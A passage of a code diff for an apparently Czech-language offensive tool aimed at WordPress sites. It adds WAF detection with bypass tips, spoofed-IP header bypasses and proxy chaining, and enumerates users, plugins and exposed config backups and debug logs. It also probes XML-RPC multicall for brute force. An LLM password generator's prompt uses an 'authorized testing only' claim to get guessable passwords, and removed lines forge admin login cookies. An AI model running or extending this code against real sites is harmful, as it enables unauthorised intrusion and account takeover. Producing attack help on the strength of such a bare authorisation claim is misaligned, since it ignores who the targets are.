-                                    results["vulnerabilities"].append(f"{name} není HttpOnly")
+            if detected:
+                self.waf_detected = detected
+                for waf in detected:
+                    self.output.warning(f"WAF detekován: {waf}")
+                    self.output.add_finding("WAF", waf, "danger")
+                
+                # Bypass tipy pro každý WAF
+                bypass_tips = {
+                    "CloudFlare": "Zkus: změna User-Agent, Cookie clearance, CloudScraper modul",
+                    "Sucuri": "Zkus: HTTP/1.0, starší TLS, proxy chain",
+                    "ModSecurity": "Zkus: encoding bypass (URL/Base64), CRLF injection",
+                    "Wordfence": "Zkus: rate limiting bypass, rozdělení requestů",
+                    "Akamai": "Zkus: Akamai Buster, změna TLS fingerprintu",
+                    "AWS WAF": "Zkus: rozdělení payloadu, WAF-specific bypassy",
+                }
+                for waf in detected:
+                    if waf in bypass_tips:
+                        self.output.info(f"  → Tip: {bypass_tips[waf]}")
+                
+                return detected
             else:
-                self.output.info("Žádné cookies nenalezeny")
-            
-            # Session ID predikce
-            for name, value in cookies.items():
-                if any(kw in name.lower() for kw in ['session', 'token', 'auth', 'sess']):
-                    self.output.warning(f"Session cookie: {name}, délka: {len(value)}")
-                    self.output.add_finding("Session cookie", f"{name} (délka: {len(value)})", "warning")
-                    
-                    # Test na predikovatelnost
-                    if len(value) < 20:
-                        self.output.warning(f"Krátká session ID - možná predikovatelná!")
-                        results["vulnerabilities"].append(f"Predikovatelná session: {name}")
-            
-            # Test cookie injection (admin session)
-            self.output.info("Testuji cookie injection na wp-admin...")
-            admin_url = self.target.rstrip('/') + '/wp-admin/admin-ajax.php'
-            
-            # Bezpečné vytvoření MD5 hashe
-            admin_hash = hashlib.md5(b"admin").hexdigest()[:32]
-            timestamp = str(int(time.time()) + 86400)
-            
-            test_cookies = [
-                {"wordpress_logged_in_" + admin_hash: "admin|" + timestamp + "|administrator"},
-                {"wordpress_" + admin_hash: "admin%7C" + timestamp + "%7Cadministrator"},
-            ]
-            
-            for test_c in test_cookies:
-                try:
-                    test_resp = requests.get(admin_url, cookies=test_c, timeout=5, verify=False)
-                    if test_resp.status_code not in [403, 401, 404]:
-                        self.output.success(f"Cookie injekce možná! (Status: {test_resp.status_code})")
-                        results["vulnerabilities"].append("Cookie injection možná")
-                        self.output.add_finding("Cookie injekce", f"Možná! Status: {test_resp.status_code}", "danger")
-                except Exception:
-                    pass
-            
-            self.output.separator()
-            
-        except requests.exceptions.ConnectionError as e:
-            self.output.error(f"Připojení selhalo: {str(e)}")
+                self.output.success("WAF nedetekován")
+                return []
+                
         except Exception as e:
-            self.output.error(f"Cookie analýza selhala: {str(e)}")
+            self.output.warning(f"WAF detekce selhala: {str(e)[:40]}")
+            return []
+    
+    def _apply_bypasses(self):
+        """Aplikuje bypass techniky"""
+        results = {}
         
-        return results
-
-
-# =============================================================================
-# BYPASS RESEARCHER
-# =============================================================================
-
-class BypassResearcher:
-    """Hledá alternativní cesty k admin přístupu"""
-    
-    def __init__(self, target, output):
-        self.target = target
-        self.output = output
-        self.findings = {}
-    
-    def research(self):
-        """Prozkoumá alternativní metody přístupu"""
-        self.output.phase("BYPASS RESEARCHER - Alternativní cesty")
-        results = {
-            "xmlrpc": False,
-            "json_api": False,
-            "rest_api": False,
-            "alt_login_pages": [],
-            "debug_log": False,
-            "wp_config_backup": False,
-            "phpmyadmin": False,
-            "vulnerable_endpoints": []
+        # Bypass metody
+        bypass_headers = {
+            "X-Forwarded-For: 127.0.0.1": "Localhost bypass",
+            "X-Forwarded-For: 192.168.1.1": "Internal IP bypass",
+            "X-Real-IP: 127.0.0.1": "Real IP bypass",
+            "Client-IP: 127.0.0.1": "Client IP bypass",
+            "X-Originating-IP: 127.0.0.1": "Originating IP bypass",
+            "X-Remote-IP: 127.0.0.1": "Remote IP bypass",
+            "X-Remote-Addr: 127.0.0.1": "Remote Addr bypass",
+            "X-Client-IP: 127.0.0.1": "Client IP bypass",
+            "X-Host: 127.0.0.1": "Host bypass",
+            "X-Forwarded-Host: 127.0.0.1": "Forwarded Host bypass",
+            "Upgrade-Insecure-Requests: 1": "HTTPS bypass",
+            "Cache-Control: no-cache": "Cache bypass",
+            "Pragma: no-cache": "Pragma bypass",
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8": "Accept header bypass",
         }
         
-        base = self.target.rstrip('/')
-        headers = {"User-Agent": "Mozilla/5.0"}
+        self.output.info("Testuji bypass techniky...")
         
-        # 1. XML-RPC
-        self.output.info("Testuji XML-RPC...")
-        try:
-            xmlrpc_url = base + "/xmlrpc.php"
-            xml_data = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
-            xml_resp = requests.post(xmlrpc_url, data=xml_data, 
-                                    headers={"Content-Type": "text/xml"}, 
-                                    timeout=5, verify=False)
-            if xml_resp.status_code == 200 and "methodName" in xml_resp.text:
-                self.output.success("XML-RPC je aktivní!")
-                results["xmlrpc"] = True
-                self.output.add_finding("XML-RPC", "Aktivní - možný brute-force!", "danger")
-        except Exception:
-            pass
-        
-        # 2. REST API
-        json_url = base + "/wp-json/wp/v2/"
-        try:
-            jr = requests.get(json_url, headers=headers, timeout=5, verify=False)
-            if jr.status_code == 200:
-                self.output.success("REST API je přístupné!")
-                results["rest_api"] = True
-                self.output.add_finding("REST API", f"Přístupné - {json_url}", "warning")
-        except Exception:
-            pass
-        
-        # 3. Alternativní login stránky
-        alt_pages = [
-            "/wp-login.php", "/wp-admin/", "/login", "/admin",
-            "/user/login", "/administrator", "/site-admin",
-            "/wp-signup.php", "/backend", "/portal",
-            "/cms/wp-login.php", "/admin/login.php"
-        ]
-        
-        self.output.info("Hledám alternativní login stránky...")
-        for page in alt_pages:
+        # Rychlý test top 5 bypassů
+        top_bypasses = list(bypass_headers.items())[:5]
+        for header_value, description in top_bypasses:
             try:
-                url = base + page
-                pr = requests.get(url, headers=headers, timeout=3, verify=False, allow_redirects=False)
-                if pr.status_code in [200, 301, 302, 303]:
-                    self.output.result_line(page, str(pr.status_code), 
-                                           Fore.GREEN if pr.status_code == 200 else Fore.YELLOW)
-                    if pr.status_code == 200:
-                        results["alt_login_pages"].append(page)
-                        self.output.add_finding("Login stránka", f"{page} (HTTP {pr.status_code})", "info")
+                h_name, h_val = header_value.split(": ", 1)
+                test_headers = {"User-Agent": "Mozilla/5.0", h_name: h_val}
+                r = requests.get(self.target, headers=test_headers, timeout=5, verify=False)
+                
+                if r.status_code == 200:
+                    self.output.success(f"Bypass {description} ({h_name}) - 200 OK")
+                    results[h_name] = True
+                elif r.status_code == 403:
+                    self.output.warning(f"Bypass {description} - 403 Forbidden (stále blokován)")
+                    results[h_name] = False
+                else:
+                    self.output.result_line(f"Bypass {description}", f"{r.status_code}")
+                    results[h_name] = r.status_code
             except Exception:
                 pass
         
-        # 4. Debug log
-        debug_paths = [
-            "/wp-content/debug.log",
-            "/wp-content/debug.log.1",
-            "/wp-content/uploads/debug.log"
-        ]
-        for dp in debug_paths:
+        # Proxy bypass (pokud je nakonfigurováno)
+        proxy = self._get_proxy_chain()
+        if proxy:
+            self.output.info(f"Testuji proxy chain: {proxy[:40]}...")
             try:
-                dr = requests.get(base + dp, headers=headers, timeout=3, verify=False)
-                if dr.status_code == 200 and len(dr.text) > 50:
-                    self.output.warning(f"DEBUG LOG nalezen: {dp}")
-                    results["debug_log"] = True
-                    self.output.add_finding("Debug log", dp, "danger")
-                    # Hledání credentials v debug logu
-                    if "password" in dr.text.lower() or "DB_PASSWORD" in dr.text:
-                        self.output.error(f"Credentials v debug logu!")
-                        self.output.add_finding("Credentials v debug logu", "OKAMŽITÉ OHROŽENÍ!", "danger")
+                proxies = {"http": proxy, "https": proxy}
+                pr = requests.get(self.target, proxies=proxies, timeout=10, verify=False)
+                if pr.status_code == 200:
+                    self.output.success("Proxy bypass funguje!")
+                    results["proxy_bypass"] = True
+                else:
+                    self.output.warning(f"Proxy bypass: {pr.status_code}")
+                    results["proxy_bypass"] = False
             except Exception:
-                pass
+                self.output.warning("Proxy bypass selhal")
+                results["proxy_bypass"] = False
         
-        # 5. wp-config.php backup
-        config_paths = [
-            "/wp-config.php.bak",
-            "/wp-config.php.old",
-            "/wp-config.txt",
-            "/wp-config.save",
-            "/wp-config.php~",
-            "/wp-config.php.swp"
-        ]
-        for cp in config_paths:
-            try:
-                cr = requests.get(base + cp, headers=headers, timeout=3, verify=False)
-                if cr.status_code == 200 and "DB_NAME" in cr.text:
-                    self.output.error(f"Záloha wp-config nalezena: {cp}")
-                    results["wp_config_backup"] = True
-                    self.output.add_finding("wp-config záloha", cp, "danger")
-            except Exception:
-                pass
-        
-        # 6. phpMyAdmin
-        phpmyadmin_paths = ["/phpmyadmin", "/pma", "/phpMyAdmin", "/admin/phpmyadmin"]
-        for pp in phpmyadmin_paths:
-            try:
-                pr = requests.get(base + pp, headers=headers, timeout=3, verify=False)
-                if pr.status_code == 200 and ("phpMyAdmin" in pr.text or "pma" in pr.text[:500]):
-                    self.output.warning(f"phpMyAdmin nalezen: {pp}")
-                    results["phpmyadmin"] = True
-                    self.output.add_finding("phpMyAdmin", pp, "danger")
-            except Exception:
-                pass
-        
-        # 7. User enumeration přes REST API
-        try:
-            users_url = base + "/wp-json/wp/v2/users?per_page=100"
-            ur = requests.get(users_url, headers=headers, timeout=5, verify=False)
-            if ur.status_code == 200:
-                users = ur.json()
-                self.output.success(f"User enumeration: {len(users)} uživatelů!")
-                for u in users:
-                    name = u.get('name', u.get('slug', '?'))
-                    self.output.result_line("Uživatel", f"{name} (ID: {u.get('id', '?')})", Fore.YELLOW)
-                    self.output.add_finding("Uživatel (enum)", name, "danger")
-        except Exception:
-            pass
-        
-        self.output.separator()
-        self.findings = results
+        self.output.info("AUTO-BYPASS dokončen")
         return results
+    
+    def _get_proxy_chain(self):
+        """Získá proxy z configu"""
+        config_file = os.path.join(WORK_DIR, "config.yaml")
+        if os.path.isfile(config_file):
+            try:
+                with open(config_file) as f:
+                    data = yaml.safe_load(f)
+                    if data and 'proxy' in data:
+                        return data['proxy']
+            except Exception:
+                pass
+        
+        # Zkusíme environment variable
+        return os.environ.get('HTTP_PROXY') or os.environ.get('HTTPS_PROXY') or None
 
 
 # =============================================================================
-# AI PASSWORD GENERATOR
+# MODUL 6: WP Scanner + Enumeration
+# =============================================================================
+
+class WPScanner:
+    """Rozšířený WordPress scanner"""
+    
+    def __init__(self, target, output):
+        self.target = target
+        self.output = output
+        self.timeout = 15
+    
+    def scan(self):
+        """Hlavní scanovací rutina"""
+        self.output.phase("WORDPRESS SCAN - DEEP ENUMERATION")
+        
+        hostname = self.target.replace("https://", "").replace("http://", "").split("/")[0]
+        
+        # 1. Základní informace
+        info = self._basic_info()
+        
+        # 2. Plugin enumeration
+        plugins = self._enum_plugins()
+        
+        # 3. Theme enumeration
+        themes = self._enum_themes()
+        
+        # 4. User enumeration
+        users = self._enum_users()
+        
+        # 5. Security checks
+        security = self._security_checks()
+        
+        # 6. XML-RPC
+        xmlrpc = self._check_xmlrpc()
+        
+        return {
+            "info": info,
+            "plugins": plugins,
+            "themes": themes,
+            "users": users,
+            "security": security,
+            "xmlrpc": xmlrpc
+        }
+    
+    def _basic_info(self):
+        """Základní informace o WP"""
+        self.output.info("Získávám základní informace...")
+        info = {}
+        
+        try:
+            resp = requests.get(self.target, timeout=self.timeout, verify=False, 
+                               headers={"User-Agent": "Mozilla/5.0"})
+            soup = BeautifulSoup(resp.text, 'html.parser')
+            
+            # Generator meta tag
+            gen = soup.find("meta", attrs={"name": "generator"})
+            if gen and gen.get("content"):
+                info["wordpress_version"] = gen["content"]
+                self.output.result_line("WordPress", gen["content"])
+                self.output.add_finding("WordPress verze", gen["content"], "info")
+            
+            # Pingback
+            if "/xmlrpc.php" in resp.text:
+                info["pingback"] = True
+                self.output.result_line("Pingback", "Aktivní", Fore.YELLOW)
+            
+            # REST API
+            rest_url = self.target.rstrip('/') + "/wp-json/"
+            try:
+                rr = requests.get(rest_url, timeout=5, verify=False)
+                if rr.status_code == 200:
+                    info["rest_api"] = True
+                    self.output.result_line("REST API", "Dostupné", Fore.YELLOW)
+                    self.output.add_finding("REST API", "Dostupné", "warning")
+            except Exception:
+                pass
+            
+            # Content dir
+            if "/wp-content/" in resp.text:
+                info["wp_content"] = True
+            
+            # Admin dir
+            if "/wp-admin/" in resp.text:
+                info["wp_admin"] = True
+            
+            # Readme
+            readme_url = self.target.rstrip('/') + "/readme.html"
+            try:
+                rm = requests.get(readme_url, timeout=5, verify=False)
+                if rm.status_code == 200:
+                    info["readme"] = True
+                    self.output.warning("Readme.html dostupný - informace o verzi WP")
+                    self.output.add_finding("Readme.html", "Dostupný", "danger")
+            except Exception:
+                pass
+            
+        except Exception as e:
+            self.output.error(f"Základní info selhalo: {str(e)[:40]}")
+        
+        return info
+    
+    def _enum_plugins(self):
+        """Enumerace pluginů"""
+        self.output.info("Enumeruji pluginy...")
+        plugins = []
+        
+        try:
+            resp = requests.get(self.target, timeout=self.timeout, verify=False,
+                               headers={"User-Agent": "Mozilla/5.0"})
+            
+            # Z HTML
+            plugin_matches = re.findall(r'/wp-content/plugins/([^/]+)/', resp.text)
+            unique_plugins = OrderedDict.fromkeys(plugin_matches)
+            
+            for plugin in unique_plugins:
+                plugins.append({"name": plugin, "source": "html"})
+                self.output.result_line("Plugin", plugin, Fore.CYAN)
+                self.output.add_finding("Plugin", plugin, "info")
+            
+            # Common plugin paths
+            common_plugins = [
+                "akismet", "contact-form-7", "wordfence", "jetpack", "woocommerce",
+                "elementor", "yoast", "gravityforms", "w3-total-cache", "wp-super-cache",
+                "all-in-one-seo-pack", "revslider", "advanced-custom-fields", "redirection",
+                "better-wp-security", "really-simple-ssl", "litespeed-cache",
+                "wpforms-lite", "wordpress-seo", "disable-xml-rpc", "all-in-one-wp-migration"
+            ]
+            
+            for cp in common_plugins:
+                if cp not in unique_plugins:
+                    plugin_url = self.target.rstrip('/') + f"/wp-content/plugins/{cp}/readme.txt"
+                    try:
+                        pr = requests.get(plugin_url, timeout=3, verify=False)
+                        if pr.status_code == 200 and pr.text.strip():
+                            plugins.append({"name": cp, "source": "readme"})
+                            self.output.result_line("Plugin (readme)", cp, Fore.CYAN)
+                            self.output.add_finding("Plugin", cp, "info")
+                    except Exception:
+                        pass
+                    
+                    # CSS/JS detekce
+                    for ext in [".css?ver=", ".js?ver="]:
+                        ver_url = self.target.rstrip('/') + f"/wp-content/plugins/{cp}/{cp}.css?ver=1"
+                        try:
+                            vr = requests.get(ver_url, timeout=3, verify=False)
+                            if vr.status_code == 200:
+                                v_match = re.search(r'ver=([\d.]+)', vr.url)
+                                ver = v_match.group(1) if v_match else "?"
+                                plugins.append({"name": cp, "version": ver, "source": "css"})
+                                self.output.result_line(f"Plugin {cp}", f"verze {ver}", Fore.CYAN)
+                                self.output.add_finding(f"Plugin {cp}", f"verze {ver}", "info")
+                                break
+                        except Exception:
+                            pass
+            
+            if plugins:
+                self.output.success(f"Nalezeno {len(plugins)} pluginů")
+            else:
+                self.output.warning("Nenalezeny žádné pluginy (možná maskování)")
+            
+        except Exception as e:
+            self.output.error(f"Plugin enum selhal: {str(e)[:40]}")
+        
+        return plugins
+    
+    def _enum_themes(self):
+        """Enumerace témat"""
+        self.output.info("Enumeruji témata...")
+        themes = []
+        
+        try:
+            resp = requests.get(self.target, timeout=self.timeout, verify=False,
+                               headers={"User-Agent": "Mozilla/5.0"})
+            
+            theme_matches = re.findall(r'/wp-content/themes/([^/]+)/', resp.text)
+            unique_themes = OrderedDict.fromkeys(theme_matches)
+            
+            for theme in unique_themes:
+                themes.append({"name": theme, "source": "html"})
+                self.output.result_line("Theme", theme, Fore.MAGENTA)
+                self.output.add_finding("Theme", theme, "info")
+            
+            if themes:
+                self.output.success(f"Nalezeno {len(themes)} témat")
+            else:
+                self.output.warning("Témata nenalezena")
+        
+        except Exception as e:
+            self.output.error(f"Theme enum selhal: {str(e)[:40]}")
+        
+        return themes
+    
+    def _enum_users(self):
+        """Enumerace uživatelů přes REST API a author stránky"""
+        self.output.info("Enumeruji uživatele...")
+        users = []
+        
+        # REST API
+        rest_url = self.target.rstrip('/') + "/wp-json/wp/v2/users?per_page=100"
+        try:
+            ur = requests.get(rest_url, timeout=8, verify=False)
+            if ur.status_code == 200:
+                data = ur.json()
+                for u in data:
+                    username = u.get('slug', u.get('name', '?'))
+                    uid = u.get('id', '?')
+                    users.append({"username": username, "id": uid, "source": "rest"})
+                    self.output.result_line(f"Uživatel (REST)", f"{username} (ID: {uid})", Fore.YELLOW)
+                    self.output.add_finding("Uživatel (REST)", username, "danger")
+                
+                self.output.success(f"REST API: {len(users)} uživatelů")
+        except Exception:
+            pass
+        
+        # Author enumeration
+        if not users:
+            self.output.info("Zkouším author enumeration...")
+            for i in range(1, 21):
+                try:
+                    auth_url = self.target.rstrip('/') + f"/?author={i}"
+                    ar = requests.get(auth_url, timeout=3, verify=False, allow_redirects=True)
+                    
+                    auth_name = None
+                    if 'author/' in ar.url:
+                        auth_name = ar.url.split('author/')[1].split('/')[0].split('?')[0]
+                    
+                    if auth_name and auth_name not in [u['username'] for u in users]:
+                        users.append({"username": auth_name, "id": i, "source": "author"})
+                        self.output.result_line(f"Uživatel (author={i})", auth_name, Fore.YELLOW)
+                        self.output.add_finding("Uživatel (author)", auth_name, "danger")
+                        
+                        if len(users) >= 10:
+                            break
+                except Exception:
+                    pass
+        
+        # Zkusíme i /wp-json/wp/v2/users/ s různými parametry
+        if len(users) < 5:
+            try:
+                for offset in [0, 20, 40, 60]:
+                    rest_url2 = self.target.rstrip('/') + f"/wp-json/wp/v2/users?per_page=20&offset={offset}"
+                    ur2 = requests.get(rest_url2, timeout=5, verify=False)
+                    if ur2.status_code == 200:
+                        data = ur2.json()
+                        for u in data:
+                            username = u.get('slug', '?')
+                            if username not in [us['username'] for us in users]:
+                                users.append({"username": username, "id": u.get('id', '?'), "source": "rest_offset"})
+            except Exception:
+                pass
+        
+        if not users:
+            self.output.warning("Žádní uživatelé nenalezeni")
+        
+        return users
+    
+    def _security_checks(self):
+        """Bezpečnostní kontroly"""
+        self.output.info("Provádím bezpečnostní kontroly...")
+        check_results = {}
+        
+        # WP-Cron
+        cron_url = self.target.rstrip('/') + "/wp-cron.php"
+        try:
+            cr = requests.get(cron_url, timeout=5, verify=False)
+            if cr.status_code == 200:
+                check_results["wp_cron"] = True
+                self.output.warning("WP-Cron je veřejně přístupný!")
+                self.output.add_finding("WP-Cron", "Veřejně přístupný", "danger")
+            else:
+                check_results["wp_cron"] = False
+        except Exception:
+            pass
+        
+        # Install.php
+        install_url = self.target.rstrip('/') + "/wp-admin/install.php"
+        try:
+            ir = requests.get(install_url, timeout=5, verify=False)
+            if ir.status_code == 200:
+                check_results["install_php"] = True
+                self.output.error("WP instalační stránka je přístupná!")
+                self.output.add_finding("install.php", "Přístupný", "danger")
+            else:
+                check_results["install_php"] = False
+        except Exception:
+            pass
+        
+        # Debug log
+        debug_url = self.target.rstrip('/') + "/wp-content/debug.log"
+        try:
+            dr = requests.get(debug_url, timeout=5, verify=False)
+            if dr.status_code == 200 and "PHP" in dr.text:
+                check_results["debug_log"] = True
+                self.output.error("Debug log je veřejný!")
+                self.output.add_finding("debug.log", "Veřejně přístupný", "danger")
+            else:
+                check_results["debug_log"] = False
+        except Exception:
+            pass
+        
+        # Backup files
+        backups = [
+            "/wp-config.php.bak", "/wp-config.php~", "/wp-config.php.save",
+            "/wp-config.php.old", "/wp-config.php.swp", "/wp-config.bak",
+            "/.wp-config.php.swp", "/wp-config.txt"
+        ]
+        found_backups = []
+        for bf in backups:
+            try:
+                bu_url = self.target.rstrip('/') + bf
+                br = requests.get(bu_url, timeout=3, verify=False)
+                if br.status_code == 200 and 'DB_' in br.text:
+                    found_backups.append(bf)
+                    self.output.error(f"Záloha konfigurace: {bf}")
+                    self.output.add_finding("Záloha configu", bf, "danger")
+            except Exception:
+                pass
+        check_results["backups"] = found_backups
+        
+        return check_results
+    
+    def _check_xmlrpc(self):
+        """Kontrola XML-RPC"""
+        self.output.info("Kontroluji XML-RPC...")
+        
+        xml_url = self.target.rstrip('/') + "/xmlrpc.php"
+        xml_data = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
+        
+        try:
+            xr = requests.post(xml_url, data=xml_data,
+                              headers={"Content-Type": "text/xml"},
+                              timeout=8, verify=False)
+            
+            if xr.status_code == 200:
+                if "methodName" in xr.text:
+                    self.output.success("XML-RPC je aktivní")
+                    self.output.add_finding("XML-RPC", "Aktivní", "warning")
+                    
+                    # Extrahujeme metody
+                    methods = re.findall(r'<value><string>(.*?)</string></value>', xr.text)
+                    if methods:
+                        for m in methods:
+                            if any(kw in m.lower() for kw in ['wp.getUsers', 'wp.getOptions', 'system.multicall',
+                                                             'pingback.ping', 'wp.getComments', 'wp.getPosts',
+                                                             'wp.uploadFile', 'wp.editProfile']):
+                                self.output.warning(f"  → {m}")
+                    
+                    # Test multicall (brute-force)
+                    self.output.info("Testuji multicall (mass assignment)...")
+                    mc_data = '''<?xml version="1.0"?>
+<methodCall>
+  <methodName>system.multicall</methodName>
+  <params><param><value><array><data>
+    <value><struct>
+      <member><name>methodName</name><value><string>system.listMethods</string></value></member>
+    </struct></value>
+  </data></array></value></param></params>
+</methodCall>'''
+                    mc = requests.post(xml_url, data=mc_data,
+                                      headers={"Content-Type": "text/xml"},
+                                      timeout=5, verify=False)
+                    if mc.status_code == 200 and "methodName" in mc.text:
+                        self.output.warning("Multicall je povolen!")
+                        self.output.add_finding("XML-RPC multicast", "Povolen", "danger")
+                    
+                    return {"active": True, "methods_count": len(methods)}
+                else:
+                    self.output.info("XML-RPC endpoint existuje ale neodpovídá standardně")
+                    return {"active": False}
+            else:
+                self.output.info(f"XML-RPC: {xr.status_code}")
+                return {"active": False}
+                
+        except Exception:
+            self.output.info("XML-RPC nedostupný")
+            return {"active": False}
+
+
+# =============================================================================
+# MODUL 7: AI Password Generator (LLM-based)
 # =============================================================================
 
 class AIPasswordGenerator:
-    """AI generátor hesel z kontextu stránky"""
+    """Generátor hesel pomocí LLM (Ollama/Groq)"""
     
-    TOP_PASSWORDS = [
-        "admin", "password", "123456", "12345678", "qwerty",
-        "admin123", "letmein", "welcome", "monkey", "dragon",
-        "master", "sunshine", "princess", "football", "iloveyou",
-        "trustno1", "abc123", "passw0rd", "p@ssword", "Pa$$word",
-        "admin1", "administrator", "root", "toor", "changeme",
-        "secret", "P@ssw0rd", "Passw0rd", "p@ssw0rd", "password123",
-        "admin123456", "qwerty123", "letmein123", "welcome123",
-        "test", "test123", "demo", "demo123", "user",
-        "password1", "Password1", "Password123", "P@ssword123",
-        "admin2024", "admin2025", "admin2026", "password2024",
-        "password2025", "password2026", "changeme123", "default",
-        "wp", "wordpress", "wpadmin", "wpadm", "wp_admin"
-    ]
-    
-    KEYBOARD_PATTERNS = [
-        "qwerty", "qwertz", "asdfgh", "zxcvbn", "qwerty123",
-        "1q2w3e", "1q2w3e4r", "qwertyuiop", "123qwe", "qwe123",
-        "asdf", "asdf1234", "zxcvbnm", "1qaz2wsx", "qwaszx"
-    ]
-    
-    def __init__(self, context, output):
-        self.context = context
+    def __init__(self, target, output):
+        self.target = target
         self.output = output
+        self.config = dict(BF_AI_CONFIG)
     
-    def generate(self):
-        """Vygeneruje AI wordlist z kontextu stránky"""
-        self.output.phase("AI PASSWORD GENERATOR - Inteligentní generování")
-        self.output.info("Generuji hesla z kontextu stránky...")
+    def generate_wordlist(self, base_words, count=50):
+        """Generuje wordlist pomocí AI"""
+        self.output.phase("AI PASSWORD GENERATOR")
         
-        passwords = OrderedDict()
+        has_ollama = self._check_service()
+        if not has_ollama:
+            self.output.warning("Ollama není dostupná - používám statickou generaci")
+            return self._static_generate(base_words, count)
         
-        # 1. Základní top passwords
-        for p in self.TOP_PASSWORDS:
-            passwords[p.lower()] = 90
+        self.output.info(f"Generuji {count} hesel pomocí AI (model: {self.config['llm_model']})...")
         
-        # 2. Keyboard patterns
-        for p in self.KEYBOARD_PATTERNS:
-            passwords[p.lower()] = 80
+        prompt = f"""Generate {count} unique passwords for WordPress penetration testing.
+Target context: {self.target}
+Base keywords: {', '.join(base_words[:10])}
+
+Rules:
+- Generate realistic passwords that real people might use
+- Include passwords with: years (2020-2026), numbers, special chars, common patterns
+- Vary in length from 8 to 25 characters
+- Include: keyboard patterns, common substitutions, seasonal themes
+- Return ONLY the passwords, one per line
+- No numbers, no explanations
+- These are for authorized security testing only
+
+Format example:
+Password123!
+Summer2024!
+admin2025#
+Welcome1@
+"""
         
-        # 3. Z emailů (jména)
-        for email in self.context.get("emails", []):
-            name_part = email.split("@")[0]
-            parts = re.split(r'[._\-]', name_part)
-            for part in parts:
-                if len(part) > 2:
-                    passwords[part.lower()] = 75
-                    passwords[part.lower() + "123"] = 70
-                    passwords[part.lower() + "!"] = 68
-                    passwords[part.capitalize()] = 65
-                    passwords[part.capitalize() + "123"] = 62
-                    passwords[part.lower() + "2024"] = 60
-                    passwords[part.lower() + "2025"] = 60
-                    passwords[part.lower() + "2026"] = 60
-        
-        # 4. Z názvu stránky
-        title = self.context.get("title", "")
-        if title:
-            title_words = re.findall(r'\w+', title.lower())
-            for w in title_words[:5]:
-                if len(w) > 2:
-                    passwords[w] = 85
-                    passwords[w + "123"] = 80
-                    passwords[w + "!"] = 78
-                    passwords[w.capitalize()] = 75
-                    passwords[w.capitalize() + "123"] = 72
-        
-        # 5. Z názvu firmy
-        company = self.context.get("company", "")
-        if company:
-            company_words = re.findall(r'\w+', company.lower())
-            for w in company_words[:3]:
-                if len(w) > 2:
-                    passwords[w] = 88
-                    passwords[w + "123"] = 83
-                    passwords[w + "!"] = 80
-                    passwords[w + "2024"] = 78
-                    passwords[w + "2025"] = 78
-                    passwords[w + "2026"] = 78
-                    passwords[w.capitalize()] = 76
-                    passwords[w.capitalize() + "123"] = 74
-        
-        # 6. Z klíčových slov stránky
-        for kw in self.context.get("keywords", [])[:10]:
-            if len(kw) > 3:
-                passwords[kw.lower()] = 70
-                passwords[kw.lower() + "123"] = 65
-                passwords[kw.capitalize()] = 62
-        
-        # 7. Kombinace jméno + rok
-        for email in self.context.get("emails", []):
-            name = email.split("@")[0].split(".")[0] if "." in email.split("@")[0] else email.split("@")[0]
-            if len(name) > 2:
-                for year in ["2024", "2025", "2026", "2023", "2022", "2021", "2020"]:
-                    passwords[name.lower() + year] = 70
-                    passwords[name.capitalize() + year] = 65
-                    passwords[name.lower() + "@" + year] = 60
-        
-        # 8. Leetspeak varianty
-        leet_map = {'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7', 'l': '1'}
-        for base_word in list(passwords.keys())[:30]:
-            leet_word = base_word
-            for orig, repl in leet_map.items():
-                leet_word = leet_word.replace(orig, repl)
-            if leet_word != base_word and len(leet_word) > 3:
-                passwords[leet_word] = passwords[base_word] + 5
-        
-        # 9. České specifické
-        czech_common = ["heslo", "admin", "spravce", "root", "tajne", "klic", "pristup"]
-        for cw in czech_common:
-            passwords[cw] = 75
-            passwords[cw + "123"] = 70
-        
-        # 10. Wordpress specifické
-        wp_specific = [
-            "wp", "wordpress", "wpadmin", "adminwp", "wpadm",
-            "wordpress123", "wp2024", "wp2025", "wp2026",
-            "wproot", "wpadmin123", "administratorwp"
-        ]
-        for wpw in wp_specific:
-            passwords[wpw] = 72
-        
-        # Převod na seřazený list podle skóre
-        sorted_passwords = sorted(passwords.items(), key=lambda x: x[1], reverse=True)
-        
-        self.output.success(f"Vygenerováno {len(sorted_passwords)} unikátních hesel")
-        self.output.info(f"Top 5: {', '.join([p[0] for p in sorted_passwords[:5]])}")
-        
-        # Export do souboru
-        wordlist_file = f"ai_wordlist_{int(time.time())}.txt"
         try:
-            with open(wordlist_file, 'w', encoding='utf-8') as f:
-                for pw, _ in sorted_passwords:
-                    f.write(pw + "\n")
-            self.output.success(f"Wordlist uložen: {wordlist_file}")
-            self.output.add_finding("AI Wordlist", f"{len(sorted_passwords)} hesel → {wordlist_file}", "info")
+            payload = {
+                "model": self.config['llm_model'],
+                "prompt": prompt,
+                "stream": False,
+                "options": {"temperature": 0.9, "num_predict": 2048}
+            }
+            resp = requests.post(f"{self.config['ollama_url']}/api/generate",
+                                json=payload, timeout=60)
+            
+            if resp.status_code == 200:
+                data = resp.json()
+                text = data.get('response', '')
+                
+                passwords = [p.strip() for p in text.split('\n') 
+                           if p.strip() and not p.strip().startswith(('#', '-', '`'))]
+                passwords = [p for p in passwords if len(p) >= 4][:count]
+                
+                if passwords:
+                    self.output.success(f"AI vygenerovala {len(passwords)} hesel")
+                    wordlist_file = os.path.join(WORDLIST_DIR, f"ai_generated_{int(time.time())}.txt")
+                    with open(wordlist_file, 'w') as f:
+                        f.write('\n'.join(passwords))
+                    self.output.result_line("Uloženo", wordlist_file)
+                    return passwords
+                else:
+                    self.output.warning("AI nevrátila validní hesla")
+                    return self._static_generate(base_words, count)
+            else:
+                self.output.warning(f"Ollama error: {resp.status_code}")
+                return self._static_generate(base_words, count)
+                
         except Exception as e:
-            self.output.error(f"Nelze uložit wordlist: {str(e)}")
-            wordlist_file = None
+            self.output.warning(f"AI generátor selhal: {str(e)[:40]}")
+            return self._static_generate(base_words, count)
+    
+    def _static_generate(self, base_words, count):
+        """Statická generace hesel bez AI"""
+        self.output.info(f"Generuji {count} hesel staticky...")
+        passwords = set()
         
-        self.output.separator()
-        return [p[0] for p in sorted_passwords], wordlist_file
+        base = ["admin", "wordpress", "wp", "user", "pass", "login", "web", "site",
+                "abc", "test", "demo", "root", "master", "hello", "welcome",
+                "password", "secret", "changeme", "default", "temporary",
+                "qwerty", "letmein", "sunshine", "princess", "dragon",
+                "monkey", "football", "iloveyou", "trustno1", "shadow",
